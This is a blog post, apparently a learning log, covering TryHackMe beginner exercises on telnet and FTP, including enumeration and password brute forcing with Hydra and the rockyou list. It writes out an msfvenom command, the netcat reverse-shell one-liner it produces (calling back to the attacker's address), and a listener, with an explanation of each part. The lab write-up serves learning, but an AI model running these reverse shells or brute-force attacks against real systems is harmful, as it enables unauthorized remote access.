---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-02 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html
author: 100007
---

# Network Services

## Exploiting Telnet

```
# Listen for ICMP ping packets on an interface:
#
sudo tcpdump ip proto \icmp -i $IFACE

# Use Metasploit to generate the code for a remote shell:
# 
msfvenom -p cmd/unix/reverse_netcat lhost=$LOCAL_IP \
	lport=$LOCAL_PORT R

# Spin up a listener using netcat:
#
nc -lvp $LOCAL_PORT
```

In this exercise, Metasploit generates code that looks like this:

```
mkfifo /tmp/qdsrgu; \
	nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | \
	/bin/sh >/tmp/qdsrgu 2>&1; \
	rm /tmp/qdsrgu
```

($LOCAL\_IP and $LOCAL\_PORT aren’t literal - they’re _actually_ the local IP address of my machine on TryHackMe’s VPN and my chosen port. Neither of which should be particularly sensitive, but I’m still not going to post it on the internet!)

What’s going on here?

- `mkfifo /tmp/qdsrgu` creates a named pipe at /tmp/qdsrgu.
- We then spin up a netcat instance directed at our local machine (`nc $LOCAL_IP $LOCAL_PORT`), direct the contents of the pipe into netcat’s STDIN (`0< /tmp/qdsrgu`), pipe the _output_ of netcat to a shell we know probably exists (`| /bin/sh`), and finally redirect _both_ STDOUT and STDERR back into the named pipe (`> /tmp/qdsrgu 2>&1`).
- On the local machine, `nc -lvp $LOCAL_PORT` listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh _there_. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.

## Understanding FTP

The active vs. passive FTP distinction is about how the _server_ handles establishing the data channel (the command channel is always set up by the client connecting to the server).

Active FTP: The client opens a port which the server _actively_ connects to when establishing the data channel.

Passive FTP: The server opens a port which the client connects to when establishing the data channel.

- [File Transfer Protocol (Wikipedia)](https://en.wikipedia.org/wiki/File_Transfer_Protocol)

## Enumerating FTP

FTP denotes user accounts using a leading tilde; thus `cwd ~admin` will attempt to change the current working directory to the home directory of the `admin` user. Some (older) FTP daemons have a vulnerability where they allow the use of the `cwd` directory before login, and will return an error when attempting to change to a non-existent user directory.

Use nmap’s -sV option to attempt to probe for the service name and version information behind an open port.

Anonymous FTP logins, if allowed, use the username `anonymous` and a blank password.

- [Solaris 2.6/7.0 - IN.FTPD CWD ‘Username’ Enumeration](https://www.exploit-db.com/exploits/20745)

## Exploiting FTP

Hydra can directly try to brute force passwords on remote machines.

Kali’s rockyou.txt.gz is apparently a list of 14 million passwords dumped during the hack of some service called RockYou that I hadn’t previously heard of. Apparently RockYou was a social network that allowed direct connection to other social networks (including Facebook and MySpace)… And stored all of the relevant passwords (including their own) in the clear!

- [rockyou.txt wordlist](https://github.com/zacheller/rockyou)
- [RockYou Hack: From Bad To Worse](https://techcrunch.com/2009/12/14/rockyou-hack-security-myspace-facebook-passwords/)
